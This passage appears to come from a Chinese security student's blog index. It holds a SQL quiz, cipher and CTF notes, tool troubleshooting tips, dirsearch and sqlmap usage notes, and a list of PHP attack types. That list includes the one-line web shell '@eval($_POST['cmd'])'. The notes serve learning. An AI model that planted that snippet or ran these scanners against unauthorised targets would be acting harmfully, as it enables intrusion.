<p>来自 <a href="http://127.0.0.1/sqllib/Less-20/index.php">http://127.0.0.1/sqllib/Less-20/index.php</a> </p>
]]></content>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>sql测试</title>
    <url>/2021/05/31/sql/sql%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>SQL 测验</th>
<th>结果:14/6</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>1. SQL 指的是？</strong></p>
<p><strong>你的回答:</strong> Structured Query Language</p>
<p> 回答正确!</p>
<hr>
<p><strong>2. 哪个 SQL 语句用于从数据库中提取数据？</strong></p>
<p><strong>你的回答:</strong> GET</p>
<p> 回答错误!</p>
<p> 正确答案：SELECT</p>
<hr>
<p><strong>3. 哪条 SQL 语句用于更新数据库中的数据？</strong></p>
<p><strong>你的回答:</strong> UPDATE</p>
<p> 回答正确!</p>
<hr>
<p><strong>4. 哪条 SQL 语句用于删除数据库中的数据？</strong></p>
<p><strong>你的回答:</strong> DELETE</p>
<p> 回答正确!</p>
<hr>
<p><strong>5. 哪条 SQL 语句用于在数据库中插入新的数据？</strong></p>
<p><strong>你的回答:</strong> INSERT INTO</p>
<p> 回答正确!</p>
<hr>
<p><strong>6. 通过 SQL，您如何从 “Persons” 表中选取 “FirstName” 列？</strong></p>
<p><strong>你的回答:</strong> SELECT FirstName FROM Persons</p>
<p> 回答正确!</p>
<hr>
<p><strong>7. 通过 SQL，您如何从 “Persons” 表中选取所有的列？</strong></p>
<p><strong>你的回答:</strong> SELECT * FROM Persons</p>
<p> 回答正确!</p>
<hr>
<p><strong>8. 通过 SQL，您如何从 “Persons” 表中选取 “FirstName” 列的值等于”Peter” 的所有记录？</strong></p>
<p><strong>你的回答:</strong> SELECT * FROM Persons WHERE FirstName=’Peter’</p>
<p> 回答正确!</p>
<hr>
<p><strong>9. 通过 SQL，您如何从 “Persons” 表中选取 “FirstName” 列的值以 “a” 开头的所有记录？</strong></p>
<p><strong>你的回答:</strong> SELECT * FROM Persons WHERE FirstName=’a’</p>
<p> 回答错误!</p>
<p> 正确答案：SELECT * FROM Persons WHERE FirstName LIKE ‘a%’</p>
<hr>
<p><strong>10. 请判断下列说法是否正确：当所列出的某个条件为 true 时，OR 运算符会显示记录。当列出的所有条件为 true 时，AND 运算符会显示记录。</strong></p>
<p><strong>你的回答:</strong> 正确</p>
<p> 回答正确!</p>
<hr>
<p><strong>11. 通过 SQL，您如何在表 Persons 中选择 FirstName 等于 Thomas 而 LastName 等于 Carter 的所有记录？</strong></p>
<p><strong>你的回答:</strong> SELECT * FROM Persons WHERE FirstName LIKE ‘Thomas’ AND LastName LIKE ‘Carter’</p>
<p> 回答错误!</p>
<p> 正确答案：SELECT * FROM Persons WHERE FirstName=’Thomas’ AND LastName=’Carter’</p>
<hr>
<p><strong>12. 通过 SQL，您如何按字母顺序选取 Persons 表中 LastName 介于 Adams 和 Carter 的所有记录？</strong></p>
<p><strong>你的回答:</strong> SELECT * FROM Persons WHERE LastName BETWEEN ‘Adams’ AND ‘Carter’</p>
<p> 回答正确!</p>
<hr>
<p><strong>13. 哪条 SQL 语句可返回唯一不同的值？</strong></p>
<p><strong>你的回答:</strong> SELECT UNIQUE</p>
<p> 回答错误!</p>
<p> 正确答案：SELECT DISTINCT</p>
<hr>
<p><strong>14. 哪个 SQL 关键词用于对结果集进行排序？</strong></p>
<p><strong>你的回答:</strong> ORDER BY</p>
<p> 回答正确!</p>
<hr>
<p><strong>15. 通过 SQL，您如何根据 “FirstName” 列降序地从 “Persons” 表返回所有记录？</strong></p>
<p><strong>你的回答:</strong> SELECT * FROM Persons ORDER BY FirstName DESC</p>
<p> 回答正确!</p>
<hr>
<p><strong>16. 通过 SQL，您如何向 “Persons” 表插入新的记录？</strong></p>
<p><strong>你的回答:</strong> INSERT INTO Persons VALUES (‘Jimmy’, ‘Jackson’)</p>
<p> 回答正确!</p>
<hr>
<p><strong>17. 通过 SQL，您如何向 “Persons” 表中的 “LastName” 列插入 “Wilson” ？</strong></p>
<p><strong>你的回答:</strong> INSERT INTO Persons (LastName) VALUES (‘Wilson’)</p>
<p> 回答正确!</p>
<hr>
<p><strong>18. 您如何把 “Persons” 表中 “LastName” 列的 “Gates” 改为 “Wilson” ？</strong></p>
<p><strong>你的回答:</strong> MODIFY Persons SET LastName=’Wilson’ WHERE LastName=’Gates’</p>
<p> 回答错误!</p>
<p> 正确答案：UPDATE Persons SET LastName=’Wilson’ WHERE LastName=’Gates’</p>
<hr>
<p><strong>19. 通过 SQL，您如何在 “Persons” 表中删除 “FirstName” 等于 “Fred” 的纪录？</strong></p>
<p><strong>你的回答:</strong> DELETE FROM Persons WHERE FirstName = ‘Fred’</p>
<p> 回答正确!</p>
<hr>
<p><strong>20. 通过 SQL，您如何返回 “Persons” 表中记录的数目？</strong></p>
<p><strong>你的回答:</strong> SELECT COUNT() FROM Persons</p>
<p> 回答错误!</p>
<p> 正确答案：SELECT COUNT(*) FROM Persons</p>
]]></content>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学</title>
    <url>/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    <content><![CDATA[<p>密码：基本思想  伪装</p>
<p>明文空间M 集合</p>
<p>密文空间C  集合</p>
<p>密钥空间K            Ke 加密钥   Kd 解密钥</p>
<p>加密算法E：M—&gt;C</p>
<p>解密算法D：C—-&gt;M   而且解密变换是加密变换的逆过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;img-blog.csdn.net&#x2F;20180831003945940?watermark&#x2F;2&#x2F;text&#x2F;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw&#x3D;&#x3D;&#x2F;font&#x2F;5a6L5L2T&#x2F;fontsize&#x2F;400&#x2F;fill&#x2F;I0JBQkFCMA&#x3D;&#x3D;&#x2F;dissolve&#x2F;70</span><br></pre></td></tr></table></figure>

<p>共模<br>设a，b为正整数，如果用m分别除去a和b所得的余数相同，则称a和b关于模m同余<br>记作a=b<mod m><br>eg:1=27<mod26><br>(一个数除以比它大的数，余数为它本身）</mod26></mod></p>
<p>密码学了解：</p>
<p>1、<strong>对称密码算法</strong></p>
<p>加密密钥和解密密钥相同（或者实质上等同，即从一个易推出另一个），</p>
<p>• DES、3DES、IDEA、AES</p>
<p>2、<strong>非对称密码算法</strong></p>
<p>加密密钥和解密密钥不同，其中的加密密钥可以公开， 称为公开密钥，简称公钥；解密密钥必须保密，称为私人密钥，</p>
<p>• RSA、ECC、ElGamal</p>
<h3 id="3、编码方式"><a href="#3、编码方式" class="headerlink" title="3、编码方式"></a>3、<strong>编码方式</strong></h3><p>ASCII编码：ASCII在线转换地址：<a href="http://www.mokuge.com/tool/asciito16/">http://www.mokuge.com/tool/asciito16/</a></p>
<h4 id="base家族编码"><a href="#base家族编码" class="headerlink" title="base家族编码"></a>base家族编码</h4><ul>
<li>base2: 2进制</li>
<li>base10: 10进制</li>
<li>base16（HEX): 计算机字节表示，0<del>9，A</del>F，16位组成</li>
<li>base32: 字母加数字，大写字母，234567,32位组成</li>
<li>base64: 更大的表示范围,大小写字母，0~9，+，-,64位组成的。(做题时经常明显的等号==)</li>
<li>base58: bitcoin为了比base64更易读采用的表示</li>
</ul>
<p>具体实现可以分为2种，能利用bit位直接转换的base(例如base2, base16,base32, base64),和不能利用bit位直接转换的base(例如base10, base58)。</p>
<p><img src="/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(182).png"></p>
<p>关于base16，32，64的文章：<a href="https://blog.csdn.net/lili13897741554/article/details/82177472">https://blog.csdn.net/lili13897741554/article/details/82177472</a></p>
<h4 id="misc的图形密码"><a href="#misc的图形密码" class="headerlink" title="misc的图形密码"></a>misc的图形密码</h4><p>（也是有关密码就记录在这里了）</p>
<h5 id="1-猪圈密码"><a href="#1-猪圈密码" class="headerlink" title="1.猪圈密码"></a>1.猪圈密码</h5><p>这个应该很常见了（当然还包括很多变形</p>
<p><img src="https://img-blog.csdnimg.cn/2020121317155637.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h5 id="2-圣堂武士密码-猪圈变形1"><a href="#2-圣堂武士密码-猪圈变形1" class="headerlink" title="2.圣堂武士密码-猪圈变形1"></a>2.圣堂武士密码-猪圈变形1</h5><p><img src="https://img-blog.csdnimg.cn/20201213171645589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h5 id="3-猪圈变形2"><a href="#3-猪圈变形2" class="headerlink" title="3.猪圈变形2"></a>3.猪圈变形2</h5><p><img src="https://img-blog.csdnimg.cn/20201213171716955.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h5 id="4-猪圈变形4"><a href="#4-猪圈变形4" class="headerlink" title="4.猪圈变形4"></a>4.猪圈变形4</h5><p><img src="https://img-blog.csdnimg.cn/20201213171957838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h5 id="5-宇宙的信号"><a href="#5-宇宙的信号" class="headerlink" title="5.宇宙的信号"></a>5.宇宙的信号</h5><p><img src="https://img-blog.csdnimg.cn/20201213172025785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h5 id="6-福尔摩斯跳舞的小人"><a href="#6-福尔摩斯跳舞的小人" class="headerlink" title="6.福尔摩斯跳舞的小人"></a>6.福尔摩斯跳舞的小人</h5><p>有拿旗子和不拿旗子两种</p>
<p><img src="https://img-blog.csdnimg.cn/20201213172051787.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h5 id="7-a-z是顺序来的"><a href="#7-a-z是顺序来的" class="headerlink" title="7.a-z是顺序来的"></a>7.a-z是顺序来的</h5><p><img src="https://img-blog.csdnimg.cn/20201213172133298.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h5 id="8-古埃及象形文字"><a href="#8-古埃及象形文字" class="headerlink" title="8.古埃及象形文字"></a>8.古埃及象形文字</h5><p><img src="https://img-blog.csdnimg.cn/20201213172239642.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h5 id="9-古精灵语"><a href="#9-古精灵语" class="headerlink" title="9.古精灵语"></a>9.古精灵语</h5><p>字母<br>数字</p>
<p><img src="https://img-blog.csdnimg.cn/20201213172259135.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h5 id="10-神奇宝贝鸟图腾"><a href="#10-神奇宝贝鸟图腾" class="headerlink" title="10.神奇宝贝鸟图腾"></a>10.神奇宝贝鸟图腾</h5><p><img src="https://img-blog.csdnimg.cn/20201213172434844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h5 id="11-阿雷西博射电望远镜用二进制表示1-10数字"><a href="#11-阿雷西博射电望远镜用二进制表示1-10数字" class="headerlink" title="11.阿雷西博射电望远镜用二进制表示1-10数字"></a>11.阿雷西博射电望远镜用二进制表示1-10数字</h5><p><img src="https://img-blog.csdnimg.cn/20201213172805434.png#pic_center" alt="在这里插入图片描述"></p>
<h5 id="12-盲文"><a href="#12-盲文" class="headerlink" title="12.盲文"></a>12.盲文</h5><p>这里只有英文字母和数字，当然声母韵母声调等还是 不一样的。</p>
<p><img src="https://img-blog.csdnimg.cn/20201213172831531.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/2020121317322193.png#pic_center" alt="在这里插入图片描述"></p>
<h5 id="13-音符加密"><a href="#13-音符加密" class="headerlink" title="13.音符加密"></a>13.音符加密</h5><p><img src="https://img-blog.csdnimg.cn/20201213173240570.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201213173240509.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201213173240489.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="14-天干地支"><a href="#14-天干地支" class="headerlink" title="14.天干地支"></a>14.天干地支</h5><p><img src="https://img-blog.csdnimg.cn/20201213173309635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h5 id="15-搜狗软键盘"><a href="#15-搜狗软键盘" class="headerlink" title="15.搜狗软键盘"></a>15.搜狗软键盘</h5><p><img src="https://img-blog.csdnimg.cn/20210112163836195.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>原文链接：<a href="https://blog.csdn.net/Amherstieae/article/details/111134283">https://blog.csdn.net/Amherstieae/article/details/111134283</a></p>
<h5 id="星座密码"><a href="#星座密码" class="headerlink" title="星座密码"></a>星座密码</h5><p><img src="/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20210531213925718.png" alt="image-20210531213925718"></p>
]]></content>
      <tags>
        <tag>cryptography</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试_基础入门_概念名词</title>
    <url>/2021/08/27/src/1/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/weixin_44519789/article/details/114131958">https://blog.csdn.net/weixin_44519789/article/details/114131958</a></p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>博客解疑</title>
    <url>/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/</url>
    <content><![CDATA[<h3 id="当输入hexo-g发布博文并预览时出现下面的提示："><a href="#当输入hexo-g发布博文并预览时出现下面的提示：" class="headerlink" title="当输入hexo -g发布博文并预览时出现下面的提示："></a>当输入hexo -g发布博文并预览时出现下面的提示：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line x, column y:</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>报错信息是提示hexo的yml配置文件 冒号后面少了空格 解决方案：到提示行将对应的空格补上即可。</p>
<h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><p>如果标题用诸如[网鼎杯] 2020 青龙组AreUSerialz的时候，会出现报错</p>
<p>原因猜测为hexo标题默认加上了[ ],我们再次添加这个符号就会产生报错。</p>
<h3 id="hexo-s-时出现报错"><a href="#hexo-s-时出现报错" class="headerlink" title="hexo -s 时出现报错"></a>hexo -s 时出现报错</h3><p>Port 4000 has been used. Try other port instead.</p>
<p>分析了一下，应该是我恰巧同时使用PHP study和hexo静态页面，所以占用了端口，查找文章获得方法：</p>
<p>可以在站点下的文件_config.yml内加上如下代码更改hexo-server运行时的端口号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 4001 #端口号随意，默认是4000</span><br><span class="line">  compress: true</span><br><span class="line">  header: true</span><br></pre></td></tr></table></figure>



<h3 id="About-photograph"><a href="#About-photograph" class="headerlink" title="About photograph"></a>About photograph</h3><p>今天再次尝试博客上传图片（好吧，都是因为之前自己不断失败，苦笑ing）</p>
<p>重新看了下csdn上一篇好文章</p>
<p>附上链接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;xjm850552586&#x2F;article&#x2F;details&#x2F;84101345?ops_request_misc&#x3D;%25257B%252522request%25255Fid%252522%25253A%252522161371871416780266219548%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id&#x3D;161371871416780266219548&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-84101345.pc_search_result_before_js&amp;utm_term&#x3D;hexo%25E5%259B%25BE%25E7%2589%2587</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后本地只需在文件的相同名文件夹下保存图片，然后markdown编辑时直接添加图片即可啦。</p>
<p>注意：文章和同名文件夹需要在同一目录下，否则会显示丢失路径。</p>
<h3 id="burp-intruder爆破出现-Payload-set-1-Invalid-number-settings的解决办法"><a href="#burp-intruder爆破出现-Payload-set-1-Invalid-number-settings的解决办法" class="headerlink" title="burp intruder爆破出现 Payload set 1: Invalid number settings的解决办法"></a>burp intruder爆破出现 Payload set 1: Invalid number settings的解决办法</h3><p>如果点击start attrack 后出现 Payload set 1: Invalid number settings 的提示，先点hex 后点 decimal 再开始start attrack，这是一个软件bug，需要手动让它刷新。<br><img src="https://img-blog.csdnimg.cn/20190901085439370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190901085447734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="Python数据可视化利器Matplotlib，无法显示中文，怎么办？"><a href="#Python数据可视化利器Matplotlib，无法显示中文，怎么办？" class="headerlink" title="Python数据可视化利器Matplotlib，无法显示中文，怎么办？"></a>Python数据可视化利器Matplotlib，无法显示中文，怎么办？</h3><p><a href="https://zhuanlan.zhihu.com/p/104081310?utm_source=wechat_timeline">彻底解决Python里matplotlib不显示中文的问题 - 知乎 (zhihu.com)</a></p>
<p>在自己的代码里加入如下代码：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">import matplotlib</span><br><span class="line">matplotlib.rc(&quot;font&quot;,family=&#x27;YouYuan&#x27;)</span><br></pre></td></tr></table></figure>

<p>解决<img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210527201252662.png" alt="image-20210527201252662"></p>
<h3 id="在使用phpstudy启动apache服务器时一直出现-PHP-startup-弹窗怎么办？"><a href="#在使用phpstudy启动apache服务器时一直出现-PHP-startup-弹窗怎么办？" class="headerlink" title="在使用phpstudy启动apache服务器时一直出现    PHP startup  弹窗怎么办？"></a>在使用phpstudy启动apache服务器时一直出现    PHP startup  弹窗怎么办？</h3><p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210726111000310.png" alt="image-20210726111000310"></p>
<p>上网查找后得知，这于php.ini配制文件有关</p>
<p>1.对于里面的扩展文件，若目录下无文件需要用；加以关闭。</p>
<p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210726111308665.png" alt="image-20210726111308665"></p>
<p>如图，这里的</p>
<p>extension=php_xmlrpc.dll在对应文件夹里并没有，所以我们加上分号来关闭。</p>
<p>2.路径的添加：</p>
<p>打开php.ini，如找到extension_dir修改为：</p>
<p><strong>extension_dir = “D:/Program/WAMP/php/ext”</strong></p>
<p>引号内使用绝对路径即可。</p>
<h3 id="Dirsearch的安装与使用"><a href="#Dirsearch的安装与使用" class="headerlink" title="Dirsearch的安装与使用"></a>Dirsearch的安装与使用</h3><p>记录一下啊，调试了好长一段时间才成功的扫描工具<strong>dirsearch</strong></p>
<p>总结运行成功的几个条件：</p>
<p>1.安装python版本3.7及以上，且要确保cmd命令行内默认版本正确（因为之前我为了使用GitHack而更改了python解释器）。</p>
<p>2.遇到如下报错时：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;D:\dirsearch\dirsearch.py&quot;, line 28, in &lt;module&gt;</span><br><span class="line">    from lib.controller.controller import Controller</span><br><span class="line">  File &quot;D:\dirsearch\lib\controller\__init__.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from .controller import Controller  # noqa: F401</span><br><span class="line">  File &quot;D:\dirsearch\lib\controller\controller.py&quot;, line 29, in &lt;module&gt;</span><br><span class="line">    from lib.connection.requester import Requester</span><br><span class="line">  File &quot;D:\dirsearch\lib\connection\requester.py&quot;, line 30, in &lt;module&gt;</span><br><span class="line">    from thirdparty.requests_ntlm import HttpNtlmAuth</span><br><span class="line">  File &quot;D:\dirsearch\thirdparty\requests_ntlm\__init__.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from .requests_ntlm import HttpNtlmAuth</span><br><span class="line">  File &quot;D:\dirsearch\thirdparty\requests_ntlm\requests_ntlm.py&quot;, line 5, in &lt;module&gt;</span><br><span class="line">    from cryptography import x509</span><br><span class="line">ModuleNotFoundError: No module named &#39;cryptography&#39;</span><br></pre></td></tr></table></figure>

<p>说明库没装上，可以去pycharm里自行安装完整。</p>
<p>附上图:</p>
<p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210802195925831.png"></p>
<p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210802200037618.png"></p>
<p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210802200638164.png"></p>
<p>dirseach自带的字典在db目录下，使用格式以及常用参数如下：<br>py dirsearch.py<code>-</code>u [target url]<code>-</code>e<code>*</code></p>
<p><strong>-<code>u后面跟要扫的url</code></strong></p>
<p><strong>-<code>e是指定的url</code></strong></p>
<p><strong>-<code>w是指定字典</code></strong></p>
<p><strong>-<code>r递归目录</code></strong></p>
<p><strong>-<code>random</code>-agents使用随机UA</strong></p>
<p>还可以调低线程：*<em>dirsearch.py -u url -e * –timeout=2 -t 1 -x 400,403,404,500,503,429*</em></p>
<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sqlmap -r后面跟着文件</p>
<p>sqlmap -u后面跟着路径（url）</p>
<p>sqlmap常用参数：<br>-u : 指定目标URL，sql注入点<br>–cookie : 当前会话的cookie值<br>-b : 获取数据库类型 检索数据库管理系统的标识<br>（DBMS：Database Management System 数据库管理系统）<br>–current-db : 获取当前数据库<br>–current-user :获取当前登录数据库使用的用户</p>
<h3 id="无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够"><a href="#无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够" class="headerlink" title="无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)"></a>无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)</h3><p><a href="http://blog.csdn.net/zlchina1989/article/details/6033198">无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)  无法对状态列表目录加锁(/var/lib/dpkg/)，请查看您是否正以 root 用户运行？</a></p>
<p>解决的办法：在前面加sudo，也就是sudo apt-get install xxxxx</p>
<p>使得自己的指令拥有管理员权限。</p>
<h3 id="Hexo修改字体"><a href="#Hexo修改字体" class="headerlink" title="Hexo修改字体"></a>Hexo修改字体</h3><p><a href="https://blog.csdn.net/m0_46296826/article/details/115350456">https://blog.csdn.net/m0_46296826/article/details/115350456</a></p>
<h3 id="Hexo封面图片"><a href="#Hexo封面图片" class="headerlink" title="Hexo封面图片"></a>Hexo封面图片</h3><p>免费制作图床的网址：</p>
<p><a href="https://imgurl.org/">ImgURL免费图床</a></p>
<p>经过这里加工后，选择合适的路径</p>
<p>在博客文章的cover（可以手动添加)后面加上</p>
<p>就可以有漂亮的文章封面啦！</p>
<p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210830165519649.png" alt="image-20210830165519649"></p>
]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>leak</title>
    <url>/2021/08/25/src/leak/</url>
    <content><![CDATA[<p>PHP漏洞介绍</p>
<p><a href="https://www.jb51.net/article/31898.htm">https://www.jb51.net/article/31898.htm</a></p>
<p>针对php网站的主要几种攻击方式</p>
<h3 id="1-命令注入"><a href="#1-命令注入" class="headerlink" title="1.命令注入"></a>1.命令注入</h3><p><a href="https://blog.csdn.net/qq2539879928/article/details/106635907">https://blog.csdn.net/qq2539879928/article/details/106635907</a></p>
<h3 id="2-eval注入"><a href="#2-eval注入" class="headerlink" title="2.eval注入"></a>2.eval注入</h3><p>eval函数，常用：@eval($_POST[‘cmd’])</p>
<h3 id="3-客户端脚本攻击"><a href="#3-客户端脚本攻击" class="headerlink" title="3.客户端脚本攻击"></a>3.客户端脚本攻击</h3><h3 id="4-跨网站脚本攻击"><a href="#4-跨网站脚本攻击" class="headerlink" title="4.跨网站脚本攻击"></a>4.跨网站脚本攻击</h3><h3 id="5-sql注入攻击"><a href="#5-sql注入攻击" class="headerlink" title="5.sql注入攻击"></a>5.sql注入攻击</h3><h3 id="6-跨网站请求伪造攻击"><a href="#6-跨网站请求伪造攻击" class="headerlink" title="6.跨网站请求伪造攻击"></a>6.跨网站请求伪造攻击</h3><p>CSRF</p>
<h3 id="7-Session会话劫持"><a href="#7-Session会话劫持" class="headerlink" title="7.Session会话劫持"></a>7.Session会话劫持</h3><h3 id="8-Session固定攻击"><a href="#8-Session固定攻击" class="headerlink" title="8.Session固定攻击"></a>8.Session固定攻击</h3><h3 id="9-HTTP响应拆分攻击"><a href="#9-HTTP响应拆分攻击" class="headerlink" title="9.HTTP响应拆分攻击"></a>9.HTTP响应拆分攻击</h3><h3 id="10-文件上传漏洞"><a href="#10-文件上传漏洞" class="headerlink" title="10.文件上传漏洞"></a>10.文件上传漏洞</h3><p><a href="https://blog.csdn.net/weixin_44519789/article/details/116570426">https://blog.csdn.net/weixin_44519789/article/details/116570426</a></p>
<h3 id="11-目录穿越漏洞"><a href="#11-目录穿越漏洞" class="headerlink" title="11.目录穿越漏洞"></a>11.目录穿越漏洞</h3><p><a href="https://blog.csdn.net/angry_program/article/details/107855078">https://blog.csdn.net/angry_program/article/details/107855078</a></p>
<h3 id="12-远程文件包含攻击"><a href="#12-远程文件包含攻击" class="headerlink" title="12.远程文件包含攻击"></a>12.远程文件包含攻击</h3><p><a href="https://blog.csdn.net/qq_45300786/article/details/108724251">https://blog.csdn.net/qq_45300786/article/details/108724251</a></p>
